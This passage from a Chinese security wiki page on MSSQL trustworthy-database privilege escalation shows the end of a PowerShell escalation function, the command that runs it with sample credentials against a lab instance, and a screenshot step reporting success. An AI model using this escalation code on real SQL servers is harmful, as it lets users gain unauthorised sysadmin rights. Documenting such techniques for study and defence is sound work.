<span class="w">                </span>$<span class="n">Checksysadmin2</span><span class="w"> </span><span class="p">=</span><span class="w"> </span>$<span class="n">_</span><span class="p">.</span><span class="n">IsSysAdmin</span>
<span class="w">                </span><span class="k">if</span><span class="w"> </span><span class="p">(</span>$<span class="n">Checksysadmin2</span><span class="w"> </span><span class="o">-</span><span class="n">ne</span><span class="w"> </span><span class="mi">0</span><span class="p">){</span>
<span class="w">                    </span><span class="nb">write</span><span class="o">-</span><span class="n">host</span><span class="w"> </span><span class="s">&quot;[*] Success! - $UsertoElevate is now a sysadmin.&quot;</span><span class="w"> </span><span class="o">-</span><span class="n">foreground</span><span class="w"> </span><span class="s">&quot;green&quot;</span><span class="w"> </span>
<span class="w">                </span><span class="p">}</span><span class="k">else</span><span class="p">{</span>
<span class="w">                    </span><span class="nb">write</span><span class="o">-</span><span class="n">host</span><span class="w"> </span><span class="s">&quot;[*] Sorry, something failed, no sysadmin for you.&quot;</span><span class="w"> </span><span class="o">-</span><span class="n">foreground</span><span class="w"> </span><span class="s">&quot;red&quot;</span>
<span class="w">                </span><span class="p">}</span>
<span class="w">            </span><span class="p">}</span><span class="w">    </span>
<span class="w">         </span><span class="p">}</span><span class="w">       </span>
<span class="w">    </span><span class="p">}</span><span class="k">else</span><span class="p">{</span>
<span class="w">         </span><span class="nb">write</span><span class="o">-</span><span class="n">host</span><span class="w"> </span><span class="s">&quot;[*] Sorry, $ConnectUser doesn&#39;t have the db_owner role in any of the sysadmin databases.&quot;</span><span class="w"> </span><span class="o">-</span><span class="n">foreground</span><span class="w"> </span><span class="s">&quot;red&quot;</span><span class="w"> </span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="nb">write</span><span class="o">-</span><span class="n">host</span><span class="w"> </span><span class="s">&quot;[*] All done.&quot;</span><span class="w"> </span>
<span class="p">}</span>
</code></pre></div>

<p>首先我们先把sysadmin的权限取消掉，这里可以自行取消掉，但是要添加就会报错</p>
<p><img alt="15.png" src="../resource/Mssql%E5%8F%97%E4%BF%A1%E7%94%A8%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/media/rId46.png" /></p>
<div class="codehilite"><pre><span></span><code>Invoke-SqlServer-Escalate-DbOwner -SqlUser MyAppUser01 -SqlPass MyPassword! -SqlServerInstance WIN-80LVKKRM5UA
</code></pre></div>

<p><img alt="16.png" src="../resource/Mssql%E5%8F%97%E4%BF%A1%E7%94%A8%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/media/rId47.png" /></p>
<p>成功提权！！</p>
<h2 id="_1">参考链接<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
<blockquote>
<p><a href="https://xz.aliyun.com/t/8188">https://xz.aliyun.com/t/8188</a></p>
</blockquote>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../Mssql%20%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95%E6%8F%90%E6%9D%83/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../Mssql%20%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95%E6%8F%90%E6%9D%83/" class="btn btn-xs btn-link">
        Mssql 模拟登录提权
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../../Monstra%20CMS/%EF%BC%88CVE-2020-13384%EF%BC%89Monstra%20CMS%203.0.4%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../../Monstra%20CMS/%EF%BC%88CVE-2020-13384%EF%BC%89Monstra%20CMS%203.0.4%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        （CVE-2020-13384）Monstra CMS 3.0.4 任意文件上传漏洞
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>